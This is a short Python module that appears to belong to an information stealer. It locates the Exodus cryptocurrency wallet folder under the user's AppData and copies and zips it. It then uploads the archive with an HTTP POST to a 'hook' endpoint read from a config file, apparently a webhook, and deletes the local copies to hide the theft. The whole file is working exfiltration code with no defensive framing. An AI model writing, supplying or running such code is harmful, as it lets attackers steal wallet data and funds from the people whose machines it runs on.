import os.path, shutil, requests
from config import hook

user = os.path.expanduser("~")
def exo():
 if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
  shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
  shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")

  file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
  r = requests.post(hook, files=file)
  try:
   os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
   os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
  except:
    pass
